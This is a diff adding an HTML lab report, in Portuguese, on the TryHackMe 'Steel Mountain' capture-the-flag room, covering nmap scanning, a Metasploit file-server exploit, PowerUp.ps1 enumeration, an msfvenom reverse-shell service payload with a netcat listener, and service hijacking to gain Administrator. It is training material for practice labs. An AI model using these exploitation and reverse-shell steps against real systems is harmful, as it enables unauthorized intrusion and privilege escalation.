@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Relatório de Lab - Steel Mountain</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
+  <!-- Background image decorative -->
+  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
+    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
+  </div>
+  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
+    <!-- Cabeçalho -->
+    <header class="mb-10">
+      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center">
+        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">Steel Mountain</h1>
+        <p class="text-green-100 text-lg">Relatório de Lab <a href="https://tryhackme.com/room/steelmountain" class="text-green-600 hover:underline" target="_blank">Steel Mountain</a></p>
+        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2025</span></p>
+      </div>
+    </header>
+
+    <!-- Sumário -->
+    <nav class="mb-12">
+      <div class="bg-white rounded-xl shadow p-6 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-4">Sumário</h2>
+        <ul class="space-y-2 text-lg list-disc list-inside">
+          <li><a href="#introducao" class="text-blue-400 hover:underline">Introdução</a></li>
+          <li><a href="#cenario" class="text-blue-400 hover:underline">Cenário do Lab</a></li>
+          <li><a href="#enumeracao" class="text-blue-400 hover:underline">Enumeração Inicial</a></li>
+          <li><a href="#exploracao" class="text-blue-400 hover:underline">Exploração com Metasploit</a></li>
+          <li><a href="#pos-exploracao" class="text-blue-400 hover:underline">Pós-Exploitação com PowerShell</a></li>
+          <li><a href="#payload" class="text-blue-400 hover:underline">Geração e Execução de Payload</a></li>
+          <li><a href="#flag-root" class="text-blue-400 hover:underline">Coleta da Flag Root</a></li>
+          <li><a href="#conclusao" class="text-blue-400 hover:underline">Conclusão e Aprendizados</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- Seção: Introdução -->
+    <section class="mb-12" id="introducao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Introdução
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Este relatório técnico tem como finalidade registrar todas as etapas realizadas durante o lab <em>Steel Mountain</em>, da plataforma TryHackMe. O objetivo do lab é simular um cenário realista de intrusão em uma máquina Windows vulnerável, utilizando ferramentas como Nmap, Metasploit, PowerShell e técnicas de escalonamento de privilégios.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          O desafio foi dividido em fases práticas que incluem: enumeração inicial, exploração remota com Metasploit, pós-exploração utilizando PowerShell, e escalonamento de privilégios até o nível de administrador.
+        </p>
+      </div>
+    </section>
+
+    <!-- Seção: Cenário do Lab -->
+    <section class="mb-12" id="cenario">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Cenário do Lab
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          A máquina-alvo representa um sistema Windows com serviços acessíveis via rede, simulando um ambiente corporativo vulnerável.
+        </p>
+        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
+          <li>Descoberta de informações e reconhecimento (Recon);</li>
+          <li>Exploração de vulnerabilidade em um file server;</li>
+          <li>Execução remota de comandos via Meterpreter;</li>
+          <li>Escalonamento de privilégios com PowerShell;</li>
+          <li>Execução de payload com MSFvenom;</li>
+          <li>Coleta de flags do usuário e do administrador.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Seção: Enumeração Inicial -->
+    <section class="mb-12" id="enumeracao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Enumeração Inicial
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          A primeira pista é visual: ao acessar o IP da máquina no navegador, é exibida uma imagem com o “Funcionário do Mês”. Ao inspecionar o código-fonte da página, é possível identificar o nome do arquivo <span class="font-mono bg-gray-100 px-1 rounded">.png</span>, que revela o nome de usuário da máquina que vamos "atacar".
+        </p>
+        <img src="../images/images-steelMountain/image.png" alt="Funcionário do mês" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Em seguida, iniciamos a varredura de portas com o Nmap:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">nmap -v -sC MACHINE_IP</pre>
+        <img src="../images/images-steelMountain/image 1.png" alt="Nmap scan 1" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-steelMountain/image 2.png" alt="Nmap scan 2" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Essa varredura revelou serviços ativos, entre eles um file server. A partir disso, acessamos o serviço via navegador usando <span class="font-mono bg-gray-100 px-1 rounded">MACHINE_IP:PORTA</span>.
+        </p>
+        <img src="../images/images-steelMountain/image 3.png" alt="File server" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-steelMountain/image 4.png" alt="File server 2" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Exploração com Metasploit -->
+    <section class="mb-12" id="exploracao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Exploração com Metasploit
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Após identificar o tipo de file server em execução, foi realizada uma busca no site <a href="https://www.exploit-db.com" class="text-blue-600 hover:underline" target="_blank">Exploit-DB</a> para encontrar vulnerabilidades conhecidas (CVEs). Identificamos uma vulnerabilidade aplicável e, com o auxílio do Metasploit, seguimos os passos abaixo:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+msfconsole -q
+search nome_do_fileserver
+use exploit/windows/&lt;caminho_do_exploit&gt;
+set RHOSTS MACHINE_IP
+set RPORT PORTA_DO_FILE_SERVER
+set LHOST tun0
+set LPORT 4445
+run
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Escolhi a segunda opção, pois essa primeira é de outro CVE.
+        </p>
+        <img src="../images/images-steelMountain/image 5.png" alt="Metasploit search" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          <span class="font-mono bg-gray-100 px-1 rounded">tun0</span> é o IP da nossa máquina, nesse caso, da VPN que usamos para acessar o lab. A porta 4445 pode ser outra, é a porta de escuta, escolhi essa por hábito.
+        </p>
+        <img src="../images/images-steelMountain/image 6.png" alt="Metasploit exploit" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          O exploit teve sucesso e conseguimos uma sessão <em>Meterpreter</em> com o usuário. A partir dela, navegamos até a Desktop do usuário e encontramos a <strong>flag do usuário</strong>.
+        </p>
+        <img src="../images/images-steelMountain/image 7.png" alt="Flag usuário" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Pós-Exploitação com PowerShell -->
+    <section class="mb-12" id="pos-exploracao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Pós-Exploitação com PowerShell
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para avançar com a elevação de privilégios, foi utilizado o script <strong>PowerUp.ps1</strong>, que auxilia na enumeração de vulnerabilidades locais, já disponibilizado na Room.
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+upload PowerUp.ps1
+load powershell
+powershell_shell
+. .\PowerUp.ps1
+Invoke-AllChecks
+        </pre>
+        <img src="../images/images-steelMountain/image 8.png" alt="PowerUp.ps1" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          O PowerUp retornou várias informações, incluindo a identificação do serviço vulnerável.
+        </p>
+        <img src="../images/images-steelMountain/image 9.png" alt="Serviço vulnerável" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Geração e Execução de Payload -->
+    <section class="mb-12" id="payload">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Geração e Execução de Payload
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para explorar o serviço identificado, foi gerado um payload reverso com <span class="font-mono bg-gray-100 px-1 rounded">msfvenom</span> com o comando disponibilizado na room:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Em paralelo, precisamos deixar uma porta na escuta, nesse caso, está gerando na porta 4443, então precisaria ser:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">nc -nlvp 4443</pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          No shell, interrompemos o serviço vulnerável com:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">sc stop nomeDoServiçoVulneravel</pre>
+        <img src="../images/images-steelMountain/image 10.png" alt="sc stop" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Em seguida, fizemos o upload do payload e reiniciamos o serviço:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">sc start nomeDoServiçoVulneravel</pre>
+        <img src="../images/images-steelMountain/image 11.png" alt="sc start" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-steelMountain/image 12.png" alt="Conexão nc" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com isso, uma conexão deve ter sido feita no nc, como <strong>usuário Administrator</strong>.
+        </p>
+      </div>
+    </section>
+
+    <!-- Seção: Coleta da Flag Root -->
+    <section class="mb-12" id="flag-root">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Coleta da Flag Root
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com o acesso como administrador, foi possível navegar até o diretório Desktop do Administrator e localizar a <strong>flag de root</strong>.
+        </p>
+        <img src="../images/images-steelMountain/image 13.png" alt="Flag root" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Conclusão -->
+    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
+      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Conclusão e Aprendizados
+      </h2>
+      <ul class="list-disc pl-6 space-y-2 text-lg">
+        <li class="text-gray-800">Técnicas de reconhecimento e enumeração de informações.</li>
+        <li class="text-gray-800">Utilização do Metasploit para exploração automatizada.</li>
+        <li class="text-gray-800">Pós-exploração em ambientes Windows com PowerShell.</li>
+        <li class="text-gray-800">Criação e execução de payloads personalizados com MSFvenom.</li>
+        <li class="text-gray-800">Identificação e exploração de serviços vulneráveis para escalonamento de privilégios.</li>
+      </ul>
+      <p class="text-gray-800 mt-6 text-lg">
+        Esse tipo de prática é excelente para praticar o raciocínio lógico e uso de ferramentas ofensivas. 
+        Além disso, é sempre bom reforçar a importância de manter sistemas atualizados, com serviços bem configurados e usuários com permissões limitadas.
+      </p>
+    </div>
+
+    <!-- Botão de Voltar -->
+    <div class="text-center mt-12">
+      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
+    </div>
+  </div>
+</body>
+</html>
